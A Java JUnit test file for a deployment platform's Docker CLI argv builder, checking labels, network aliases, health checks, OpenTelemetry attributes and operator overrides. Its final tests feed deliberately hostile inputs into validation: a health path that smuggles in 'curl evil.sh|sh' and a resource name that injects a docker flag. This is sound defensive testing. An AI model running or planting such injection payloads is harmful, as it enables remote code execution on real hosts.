package eu.wohlben.qits.platform.deployments.dockerhost;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import eu.wohlben.qits.platform.deployments.deployments.control.DeploymentDriver;
import eu.wohlben.qits.platform.deployments.deployments.control.ServiceExtras;
import eu.wohlben.qits.platform.deployments.environments.entity.PdDeploymentTarget;
import eu.wohlben.qits.platform.deployments.environments.error.BadRequestException;
import io.smallrye.config.PropertiesConfigSource;
import io.smallrye.config.SmallRyeConfigBuilder;
import java.util.List;
import java.util.Map;
import org.junit.jupiter.api.Test;

/**
 * The {@code docker run} argv as assembled — plain JUnit over the package-private builder, the
 * {@code CiDaemonLauncherTest} stance: the argv IS the contract with the docker CLI, and asserting
 * it needs no docker.
 *
 * <p>It was {@code DockerDeploymentDriverTest} while this class was the whole driver. What moved
 * out is the choreography that decides WHICH container to run and when; what is asserted here is
 * unchanged, because the argv and the output parsing did not move.
 */
class DockerCliTest {

  private DockerCli driver() {
    return driver(Map.of());
  }

  private DockerCli driver(Map<String, String> properties) {
    DockerCli driver = new DockerCli();
    driver.runtime = "docker";
    driver.pullTimeoutSeconds = 600;
    driver.healthIntervalSeconds = 3;
    driver.healthRetries = 3;
    driver.healthStartPeriodSeconds = 10;
    driver.outputMaxChars = 65536;
    driver.config =
        new SmallRyeConfigBuilder()
            .withSources(new PropertiesConfigSource(properties, "test", 100))
            .build();
    return driver;
  }

  private DockerHost.StartSpec spec(String healthPath) {
    return spec(healthPath, null);
  }

  private DockerHost.StartSpec spec(String healthPath, String healthCmd) {
    return spec(healthPath, healthCmd, List.of());
  }

  private DockerHost.StartSpec spec(
      String healthPath, String healthCmd, List<DeploymentDriver.ResourceBinding> resources) {
    return new DockerHost.StartSpec(
        "env-id",
        "dev",
        "app-id",
        "qits-gateway",
        "dep-id",
        "abc1234",
        "qits-env-dev-qits-gateway",
        "qits-artifacts:8080/qits/qits-gateway:abc1234",
        "qits-pd-dev-qits-gateway-dep",
        healthPath,
        healthCmd,
        PdDeploymentTarget.ENVIRONMENT,
        true,
        resources);
  }

  /** A platform-plane container: no environment at all, and qits-platform as its primary network. */
  private DockerHost.StartSpec platformSpec() {
    return new DockerHost.StartSpec(
        null,
        null,
        "app-id",
        "qits-platform-deployments",
        "dep-id",
        "abc1234",
        "qits-platform",
        "qits-artifacts:8080/qits/qits-platform-deployments:abc1234",
        "qits-pd-qits-platform-deployments-dep",
        "/cd/q/health/ready",
        null,
        PdDeploymentTarget.PLATFORM,
        false,
        List.of());
  }

  @Test
  void theArgvCarriesNetworkAliasLabelsHealthGateAndRestartPolicy() {
    List<String> argv = driver().buildArgv(spec("/q/health/ready"));

    assertEquals(List.of("docker", "run", "-d"), argv.subList(0, 3));
    assertTrue(argv.containsAll(List.of("--network", "qits-env-dev-qits-gateway")));
    // The wire alias carries the tier: two environments hold this application's address on the
    // shared legacy network, and only the qualifier keeps them apart.
    assertTrue(argv.containsAll(List.of("--network-alias", "dev-qits-gateway")));
    assertFalse(argv.contains("qits-gateway"), "the bare name is not an alias any more: " + argv);
    assertTrue(argv.containsAll(List.of("--restart", "unless-stopped")));
    assertTrue(argv.contains("qits.platform.deployments.environment=env-id"));
    assertTrue(argv.contains("qits.platform.deployments.application=app-id"));
    assertTrue(argv.contains("qits.platform.deployments.deployment=dep-id"));
    assertTrue(argv.contains("curl -fsS http://localhost:8080/q/health/ready || exit 1"));
    assertTrue(argv.containsAll(List.of("--health-interval", "3s")));
    assertTrue(argv.containsAll(List.of("--health-retries", "3")));
    assertTrue(argv.containsAll(List.of("--health-start-period", "10s")));
    assertTrue(argv.contains("QITS_ENVIRONMENT=dev"));
    assertTrue(argv.contains("QITS_APPLICATION=qits-gateway"));
    // The image is the last token: the entrypoint is the image's own, with no command appended.
    assertEquals("qits-artifacts:8080/qits/qits-gateway:abc1234", argv.get(argv.size() - 1));
  }

  @Test
  void theArgvCarriesTheDeploymentsOtelResourceIdentity() {
    // The whole of workstream LD's first half: the container is told who it is, in OpenTelemetry's
    // own vocabulary, from values cd genuinely holds — the deployment's sha, the environment's
    // name, the container name cd just assigned. No invented version, no fake workspace ids.
    List<String> argv = driver().buildArgv(spec("/q/health/ready"));

    String expected =
        "service.version=abc1234"
            + ",deployment.environment.name=dev"
            + ",service.instance.id=qits-pd-dev-qits-gateway-dep";
    assertTrue(argv.contains("OTEL_RESOURCE_ATTRIBUTES=" + expected));
    // The Quarkus-spelled twin carries the SAME string, and is what outranks the pom version
    // Quarkus bakes into the image as service.version at build time. Built once, so they cannot
    // drift apart.
    assertTrue(argv.contains("QUARKUS_OTEL_RESOURCE_ATTRIBUTES=" + expected));
  }

  @Test
  void theInjectedIdentityIsADefaultTheDeploymentsExtrasCanOverride() {
    // Precedence, and it is docker's rule rather than cd's: the LAST assignment of a repeated env
    // key is the one the container gets. cd's variables are written before the deployment's, so
    // the deployment's pass through untouched AND win — the injection composes with the operator
    // instead of fighting them.
    DockerCli driver =
        driver(
            Map.of(
                DockerCli.EXTRAS_PREFIX + "qits-gateway.mounts[0]", "volume:qits-data:/data",
                DockerCli.EXTRAS_PREFIX + "qits-gateway.env.OTEL_RESOURCE_ATTRIBUTES",
                    "service.version=operator"));

    List<String> argv = driver.buildArgv(spec("/q/health/ready"));

    // The deployment's own, rendered last before the image.
    assertEquals(
        List.of(
            "-v",
            "qits-data:/data",
            "--env",
            "OTEL_RESOURCE_ATTRIBUTES=service.version=operator",
            "qits-artifacts:8080/qits/qits-gateway:abc1234"),
        argv.subList(argv.size() - 5, argv.size()));
    // cd's own copy is still there, and it is EARLIER — which is what makes it the loser.
    int injected = argv.indexOf("OTEL_RESOURCE_ATTRIBUTES=service.version=abc1234"
        + ",deployment.environment.name=dev"
        + ",service.instance.id=qits-pd-dev-qits-gateway-dep");
    assertTrue(injected > 0, "cd still writes its own default");
    assertTrue(injected < argv.indexOf("OTEL_RESOURCE_ATTRIBUTES=service.version=operator"));
  }

  @Test
  void aResourceAttributeValueCannotForgeASecondPair() {
    // The belt at the argv, the health-path stance. Nothing validated at the boundary can carry a
    // comma today; this is what turns a loosened boundary check into a failed deployment rather
    // than a container stamped with attributes cd never wrote.
    DockerHost.StartSpec forged =
        new DockerHost.StartSpec(
            "env-id",
            "dev,service.name=impostor",
            "app-id",
            "qits-gateway",
            "dep-id",
            "abc1234",
            "qits-env-dev-qits-gateway",
            "qits-artifacts:8080/qits/qits-gateway:abc1234",
            "qits-pd-dev-qits-gateway-dep",
            "/q/health/ready",
            null,
            PdDeploymentTarget.ENVIRONMENT,
            false,
            List.of());

    assertThrows(BadRequestException.class, () -> driver().buildArgv(forged));
  }

  @Test
  void everyExtraIsRenderedInDockersOwnSpellingBeforeTheImage() {
    // The four things an application can need beyond its image, each in `docker run`'s words: a
    // named volume, a host path, a supplementary group, a published port with the ip this
    // orchestrator can honour, and an environment variable.
    DockerCli driver =
        driver(
            Map.of(
                DockerCli.EXTRAS_PREFIX + "qits-gateway.mounts[0]", "volume:qits-data:/data",
                DockerCli.EXTRAS_PREFIX + "qits-gateway.mounts[1]",
                    "bind:/var/run/docker.sock:/var/run/docker.sock",
                DockerCli.EXTRAS_PREFIX + "qits-gateway.publishes[0]", "127.0.0.1:8081:8080",
                DockerCli.EXTRAS_PREFIX + "qits-gateway.publishes[1]", "5353:8053/udp",
                DockerCli.EXTRAS_PREFIX + "qits-gateway.groups[0]", "988",
                DockerCli.EXTRAS_PREFIX + "qits-gateway.env.FOO", "bar"));

    List<String> argv = driver.buildArgv(spec("/q/health/ready"));

    assertEquals(
        List.of(
            "-v",
            "qits-data:/data",
            "-v",
            "/var/run/docker.sock:/var/run/docker.sock",
            "-p",
            "127.0.0.1:8081:8080",
            "-p",
            "5353:8053/udp",
            "--group-add",
            "988",
            "--env",
            "FOO=bar",
            "qits-artifacts:8080/qits/qits-gateway:abc1234"),
        argv.subList(argv.size() - 13, argv.size()));
  }

  @Test
  void aReadOnlyMountKeepsItsRoSuffix() {
    DockerCli driver =
        driver(Map.of(DockerCli.EXTRAS_PREFIX + "qits-gateway.mounts[0]", "volume:qits-data:/data:ro"));

    assertTrue(driver.buildArgv(spec("/q/health/ready")).contains("qits-data:/data:ro"));
  }

  @Test
  void extrasOfAnotherApplicationDoNotLeakIn() {
    // The absence is the assertion that matters: only the deployed application's own keys reach
    // its argv, so one application's socket mount cannot ride along on a sibling's deployment.
    // The second key is the sharper half — an application whose name merely STARTS with this one's
    // is a different application, and the dot is what says so.
    DockerCli driver =
        driver(
            Map.of(
                DockerCli.EXTRAS_PREFIX + "qits-workspaces.mounts[0]",
                    "bind:/var/run/docker.sock:/var/run/docker.sock",
                DockerCli.EXTRAS_PREFIX + "qits-gateway-daemon.mounts[0]",
                    "bind:/var/run/docker.sock:/var/run/docker.sock"));

    List<String> argv = driver.buildArgv(spec("/q/health/ready"));

    assertEquals("qits-artifacts:8080/qits/qits-gateway:abc1234", argv.get(argv.size() - 1));
    assertTrue(argv.stream().noneMatch(a -> a.contains("docker.sock")));
  }

  @Test
  void anUnreadableExtraRefusesTheStartRatherThanDroppingIt() {
    // Config is typed now, so garbage in it is a bug rather than a vocabulary this driver does not
    // speak — and the failure a dropped mount produces is the worst kind: a container that boots,
    // passes its gate and has lost its volume.
    DockerCli driver =
        driver(Map.of(DockerCli.EXTRAS_PREFIX + "qits-gateway.cap-adds[0]", "SYS_ADMIN"));

    assertThrows(ServiceExtras.Refused.class, () -> driver.buildArgv(spec("/q/health/ready")));

    // And the refusal is what the caller sees: nothing runs, and the detail names the key.
    DockerHost.StartResult started =
        driver(Map.of(DockerCli.EXTRAS_PREFIX + "qits-gateway.mounts[0]", "qits-data:/data"))
            .start(spec("/q/health/ready"));
    assertFalse(started.started());
    assertTrue(started.detail().contains("qits-gateway.mounts[0]"), started.detail());
  }

  @Test
  void aliasHolderParsingMatchesByNameOrAliasAndStripsTheLeadingSlash() {
    // docker inspect emits /name; a container's own name resolves on the network, so name==alias
    // counts (the compose-seeded case) as does an explicit --network-alias (cd's own case). The
    // fourth field is the environment label, and it decides whose predecessor the holder is.
    String output =
        "aaa111|/qits-gateway|qits-gateway abc|\n"
            + "bbb222|/qits-pd-dev-qits-gateway-12345678|dev-qits-gateway|env-1\n"
            + "ccc333|/unrelated|other-alias|env-1\n";
    List<DockerHost.Holder> holders =
        DockerCli.parseHolders(output, List.of("dev-qits-gateway", "qits-gateway"));
    assertEquals(
        List.of(
            new DockerHost.Holder("aaa111", "qits-gateway", null),
            new DockerHost.Holder("bbb222", "qits-pd-dev-qits-gateway-12345678", "env-1")),
        holders);
  }

  @Test
  void theBareApplicationNameIsSearchedBesideTheQualifiedAliasDuringTheMigration() {
    // Every container started before the tier qualifier existed holds the bare name and nothing
    // else, so a search for the new spelling alone would run a second copy beside the one serving —
    // once per application, on the deployment that introduces the qualifier.
    String output = "aaa111|/qits-pd-dev-qits-gateway-old|qits-gateway|env-1\n";

    assertEquals(
        List.of(),
        DockerCli.parseHolders(output, List.of("dev-qits-gateway")),
        "the qualified alias alone does not see it");
    assertEquals(
        List.of(new DockerHost.Holder("aaa111", "qits-pd-dev-qits-gateway-old", "env-1")),
        DockerCli.parseHolders(output, List.of("dev-qits-gateway", "qits-gateway")));
  }

  @Test
  void dockerSayingTheContainerIsAlreadyOnTheNetworkIsNotAFailedJoin() {
    // The whole of what separates "the self-heal found nothing to do" from "this container is not
    // on a network it needs and no health gate will notice". The first wording is measured against
    // the platform's own daemon (29.5.3); the second is what older daemons answer.
    assertTrue(
        DockerCli.alreadyJoined(
            "Error response from daemon: endpoint with name qits-pd-dev-qits-gateway-1234abcd"
                + " already exists in network qits-net"));
    assertTrue(
        DockerCli.alreadyJoined(
            "Error response from daemon: container abc is already connected to network qits-net"));
    // Anything else is a real refusal — the match errs toward failing the deployment.
    assertFalse(
        DockerCli.alreadyJoined(
            "Error response from daemon: network qits-net not found"));
    assertFalse(DockerCli.alreadyJoined(""));
  }

  @Test
  void anUnlabelledHolderReportsNoEnvironmentWhateverDockerPrints() {
    // The container from before the labels existed is the one the migration adopts, so "no
    // environment" has to survive every spelling docker has for it: a missing field (an older
    // format), an empty one, and the `<no value>` a Go template prints for an absent map key —
    // measured on docker 29.5.3, where an `index` following the alias ranges produces exactly that.
    List<DockerHost.Holder> holders =
        DockerCli.parseHolders(
            "aaa111|/qits-gateway|qits-gateway|<no value>\n"
                + "bbb222|/seeded|qits-gateway|\n"
                + "ccc333|/older-format|qits-gateway\n",
            List.of("qits-gateway"));

    assertEquals(
        List.of(
            new DockerHost.Holder("aaa111", "qits-gateway", null),
            new DockerHost.Holder("bbb222", "seeded", null),
            new DockerHost.Holder("ccc333", "older-format", null)),
        holders);
  }

  @Test
  void theRunningImageArgvAsksForTheReferenceTheContainerWasRunWith() {
    // The startup sweep compares this answer with the row's sha, so it has to be the REFERENCE:
    // `.Image` would be the resolved image id, which carries no tag to compare with.
    assertEquals(
        List.of("docker", "inspect", "--format", "{{.Config.Image}}", "qits-pd-dev-qits-gateway-dep"),
        driver().buildRunningImageArgv("qits-pd-dev-qits-gateway-dep"));
  }

  @Test
  void theArgvLabelsThePlaneAndTheAliasAReconciliationWillNeed() {
    // These three labels are what a LATER deploy reads: when it makes a per-application network it
    // has to find this environment's public nodes and every platform container, and join them under
    // the right alias. Without qits.platform.deployments.app-name the join would land under the
    // deployment-suffixed container name, which no peer has ever been told.
    List<String> argv = driver().buildArgv(spec("/q/health/ready"));

    assertTrue(argv.contains("qits.platform.deployments.target=environment"));
    assertTrue(argv.contains("qits.platform.deployments.available-on-env=true"));
    assertTrue(argv.contains("qits.platform.deployments.app-name=qits-gateway"));
  }

  @Test
  void aPlatformServiceCarriesNoEnvironmentLabelNoQitsEnvironmentAndIsPlatformToOtel() {
    // The absence of the environment label is the feature: an environment teardown reaps by it, and
    // a platform-plane container must never go down with a tier it merely serves. QITS_ENVIRONMENT
    // is absent for the same reason — a platform service is in no environment — and OTel is told
    // the one true thing instead.
    List<String> argv = driver().buildArgv(platformSpec());

    assertTrue(
        argv.stream().noneMatch(a -> a.startsWith("qits.platform.deployments.environment=")));
    assertTrue(argv.stream().noneMatch(a -> a.startsWith("QITS_ENVIRONMENT=")));
    assertTrue(argv.contains("qits.platform.deployments.target=platform"));
    assertTrue(argv.contains("qits.platform.deployments.available-on-env=false"));
    assertTrue(argv.containsAll(List.of("--network", "qits-platform")));
    // The alias is the bare name and stays that way: one instance for the whole platform has
    // nothing to be qualified against, and the repository name already carries the plane.
    assertTrue(argv.containsAll(List.of("--network-alias", "qits-platform-deployments")));
    assertTrue(
        argv.contains(
            "OTEL_RESOURCE_ATTRIBUTES=service.version=abc1234"
                + ",deployment.environment.name=platform"
                + ",service.instance.id=qits-pd-qits-platform-deployments-dep"));
  }

  @Test
  void aCreatedNetworkCarriesTheLabelsEveryLaterLookupUsesToFindIt() {
    List<String> argv =
        driver()
            .buildNetworkCreateArgv(
                new DeploymentDriver.Network(
                    "qits-env-dev-qits-gateway",
                    "env-id",
                    DeploymentDriver.NetworkKind.APPLICATION,
                    "qits-gateway"));

    assertEquals(List.of("docker", "network", "create"), argv.subList(0, 3));
    assertTrue(argv.contains("qits.platform.deployments.network=application"));
    assertTrue(argv.contains("qits.platform.deployments.environment=env-id"));
    assertTrue(argv.contains("qits.platform.deployments.app-name=qits-gateway"));
    assertEquals("qits-env-dev-qits-gateway", argv.get(argv.size() - 1));

    // The platform network belongs to no environment and to no application, and says so by leaving
    // both labels off rather than by writing an empty one.
    List<String> platform =
        driver()
            .buildNetworkCreateArgv(
                new DeploymentDriver.Network(
                    "qits-platform", null, DeploymentDriver.NetworkKind.PLATFORM, null));
    assertTrue(platform.contains("qits.platform.deployments.network=platform"));
    assertTrue(
        platform.stream().noneMatch(a -> a.startsWith("qits.platform.deployments.environment=")));
    assertTrue(
        platform.stream().noneMatch(a -> a.startsWith("qits.platform.deployments.app-name=")));
  }

  @Test
  void networkListingReadsTheLabelsBackAndSkipsWhatIsNotCds() {
    String output =
        "qits-env-dev-qits-gateway|qits.platform.deployments.network=application,"
            + "qits.platform.deployments.environment=env-1,"
            + "qits.platform.deployments.app-name=qits-gateway\n"
            + "qits-net|qits.platform.deployments.network=bundle,"
            + "qits.platform.deployments.environment=env-1\n"
            + "qits-platform|qits.platform.deployments.network=platform\n"
            + "someone-elses|com.docker.compose.project=x\n";

    List<DeploymentDriver.Network> networks = DockerCli.parseNetworks(output);

    assertEquals(
        List.of(
            new DeploymentDriver.Network(
                "qits-env-dev-qits-gateway",
                "env-1",
                DeploymentDriver.NetworkKind.APPLICATION,
                "qits-gateway"),
            new DeploymentDriver.Network(
                "qits-net", "env-1", DeploymentDriver.NetworkKind.BUNDLE, null),
            new DeploymentDriver.Network(
                "qits-platform", null, DeploymentDriver.NetworkKind.PLATFORM, null)),
        networks);
  }

  @Test
  void aReconciliationCandidateWithoutAnAppNameLabelIsSkipped() {
    // A container from before this label existed cannot be joined under the right alias, so it is
    // left alone rather than joined under a name nothing resolves. Its own next deploy fixes it.
    List<DockerHost.Endpoint> endpoints =
        DockerCli.parseEndpoints("aaa111|qits-gateway\nbbb222|\nccc333|qits-idp\n");

    assertEquals(
        List.of(
            new DockerHost.Endpoint("aaa111", "qits-gateway"),
            new DockerHost.Endpoint("ccc333", "qits-idp")),
        endpoints);
  }

  @Test
  void aDeclaredHealthCmdReplacesTheCurlTemplateAndKeepsItsSpaces() {
    // The deployable-image case: postgres has no curl and nothing on 8080, so the repository names
    // the probe. It is ONE argv element — docker gives it to /bin/sh -c — which is why a command
    // with spaces, a flag and an || needs no quoting from this side.
    List<String> argv = driver().buildArgv(spec("/q/health/ready", "pg_isready -U postgres || exit 1"));

    int flag = argv.indexOf("--health-cmd");
    assertEquals("pg_isready -U postgres || exit 1", argv.get(flag + 1));
    // The template is gone rather than added to: two gates would be one gate too many.
    assertTrue(argv.stream().noneMatch(a -> a.startsWith("curl -fsS")), argv.toString());
    // Everything else about the gate is untouched.
    assertTrue(argv.containsAll(List.of("--health-interval", "3s")));
    assertTrue(argv.containsAll(List.of("--health-retries", "3")));
  }

  @Test
  void aHealthCmdThatIsNotOnePlainLineCannotReachTheArgv() {
    // The belt beside the health path's. The command is deliberately charset-free — it is a shell
    // command and an allowlist would refuse the useful ones — so what is left to check is that it
    // is one line and not empty.
    assertThrows(
        BadRequestException.class, () -> driver().buildArgv(spec("/q/health/ready", "ok\nsecond")));
    assertThrows(BadRequestException.class, () -> driver().buildArgv(spec("/q/health/ready", "  ")));
  }

  @Test
  void aHostileHealthPathIsNotCheckedWhenAHealthCmdReplacedIt() {
    // The path is unused once a command is declared, so it is also unchecked: an image with no HTTP
    // surface has no path worth spelling, and failing it would be failing an unread field.
    List<String> argv = driver().buildArgv(spec(null, "test -f /ready"));

    int flag = argv.indexOf("--health-cmd");
    assertEquals("test -f /ready", argv.get(flag + 1));
  }

  @Test
  void aProvisionedResourceArrivesAsTheGenericTripleBeforeTheExtras() {
    // The contract an application maps in its OWN shipped defaults: this component names no
    // framework and no datasource key, which is what lets one code path deploy a Quarkus service
    // and a plain image. The name is uppercased and its dashes underscored.
    List<String> argv =
        driver()
            .buildArgv(
                spec(
                    "/q/health/ready",
                    null,
                    List.of(
                        new DeploymentDriver.ResourceBinding(
                            "read-replica",
                            "jdbc:postgresql://dev-qits-oci-postgresql:5432/qits_gateway",
                            "qits_gateway",
                            "0123456789abcdef0123456789abcdef"))));

    assertTrue(
        argv.contains(
            "QITS_RESOURCE_READ_REPLICA_URL=jdbc:postgresql://dev-qits-oci-postgresql:5432/qits_gateway"),
        argv.toString());
    assertTrue(argv.contains("QITS_RESOURCE_READ_REPLICA_USERNAME=qits_gateway"));
    assertTrue(
        argv.contains("QITS_RESOURCE_READ_REPLICA_PASSWORD=0123456789abcdef0123456789abcdef"));
    // Before the image, like every other flag — and an application that declared none gets none.
    assertEquals("qits-artifacts:8080/qits/qits-gateway:abc1234", argv.get(argv.size() - 1));
    assertTrue(
        driver().buildArgv(spec("/q/health/ready")).stream()
            .noneMatch(a -> a.startsWith("QITS_RESOURCE_")),
        "an application that declared no resource is told about none");
  }

  @Test
  void anOperatorsExtrasStillOverrideAnInjectedResource() {
    // The precedence rule, extended to the newest injection and measured the same way: docker keeps
    // the LAST assignment of a repeated env key, and the resource triple is written before the
    // deployment's own environment, so it is a default rather than something an operator has to
    // fight.
    DockerCli driver =
        driver(
            Map.of(
                DockerCli.EXTRAS_PREFIX + "qits-gateway.env.QITS_RESOURCE_DB_URL",
                "jdbc:postgresql://somewhere-else:5432/qits_gateway"));

    List<String> argv =
        driver.buildArgv(
            spec(
                "/q/health/ready",
                null,
                List.of(
                    new DeploymentDriver.ResourceBinding(
                        "db",
                        "jdbc:postgresql://dev-qits-oci-postgresql:5432/qits_gateway",
                        "qits_gateway",
                        "0123456789abcdef0123456789abcdef"))));

    int injected =
        argv.indexOf(
            "QITS_RESOURCE_DB_URL=jdbc:postgresql://dev-qits-oci-postgresql:5432/qits_gateway");
    int operators =
        argv.indexOf("QITS_RESOURCE_DB_URL=jdbc:postgresql://somewhere-else:5432/qits_gateway");
    assertTrue(injected > 0, "this component still writes its own default");
    assertTrue(injected < operators, "and it is EARLIER, which is what makes it the loser");
  }

  @Test
  void aHostileResourceNameCannotReachTheArgv() {
    // The belt beside the health path's, on the value that becomes an environment-variable KEY. It
    // is what turns a loosened boundary check into a failed deployment rather than a container
    // carrying a variable this component never meant to write.
    assertThrows(
        BadRequestException.class,
        () ->
            driver()
                .buildArgv(
                    spec(
                        "/q/health/ready",
                        null,
                        List.of(
                            new DeploymentDriver.ResourceBinding(
                                "db=x -e EVIL", "jdbc:postgresql://h:5432/qits_a", "qits_a", "pw")))));
  }

  @Test
  void aHostileHealthPathCannotReachTheShellString() {
    // Belt on top of the boundary's braces: the one value interpolated into a string a shell will
    // run is re-validated at the last line before the argv.
    assertThrows(
        BadRequestException.class, () -> driver().buildArgv(spec("/ok; curl evil.sh|sh")));
  }
}
